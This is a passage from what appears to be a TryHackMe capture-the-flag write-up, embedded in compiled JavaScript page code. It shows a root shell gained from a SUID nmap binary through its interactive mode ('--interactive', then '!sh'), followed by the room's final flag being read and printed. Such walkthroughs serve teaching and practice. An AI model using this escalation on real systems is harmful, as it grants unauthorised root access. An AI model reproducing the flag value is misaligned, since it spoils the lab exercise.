denied\n"})}),"\n",(0,o.jsx)(n.h3,{id:"nmap-interactive",children:"nmap interactive"}),"\n",(0,o.jsxs)(n.p,{children:["I intially looked at ",(0,o.jsx)(n.code,{children:"/usr/lib/pt_chown"}),' but the THM hint said "nmap", and I can see it there ',(0,o.jsx)(n.code,{children:"/usr/local/bin/nmap"})]}),"\n",(0,o.jsxs)(n.p,{children:['nmap has an "interactive mode" that ',(0,o.jsx)(n.code,{children:'"! <command />   -- runs shell command given in the foreground"'})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'ls -l /usr/local/bin/nmap\n-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap\n/usr/local/bin/nmap --interactive\n/usr/local/bin/nmap --interactive\n\nStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )\nWelcome to Interactive Mode -- press h <enter /> for help\nsh\nsh\nUnknown command (sh) -- press h <enter /> for help\nh\nh\nNmap Interactive Commands:\nn <nmap args /> -- executes an nmap scan using the arguments given and\nwaits for nmap to finish.  Results are printed to the\nscreen (of course you can still use file output commands).\n! <command />   -- runs shell command given in the foreground\nx             -- Exit Nmap\nf [--spoof <fakeargs />] [--nmap_path <path />] <nmap args />\n-- Executes nmap in the background (results are NOT\nprinted to the screen).  You should generally specify a\nfile for results (with -oX, -oG, or -oN).  If you specify\nfakeargs with --spoof, Nmap will try to make those\nappear in ps listings.  If you wish to execute a special\nversion of Nmap, specify --nmap_path.\nn -h          -- Obtain help with Nmap syntax\nh             -- Prints this help screen.\nExamples:\nn -sS -O -v example.com/24\nf --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24\n\n!sh\n!sh\nid\nid\nuid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)\n#\n'})}),"\n",(0,o.jsx)(n.p,{children:"flag 3"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"ls /root\nfirstboot_done  key-3-of-3.txt\ncat /root/key-3-of-3.txt\ncat /root/key-3-of-3.txt\n04787ddef27c3dee1ee161b21670b4e4\n"})})]})}function c(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(h,{...e})}):h(e)}}}]);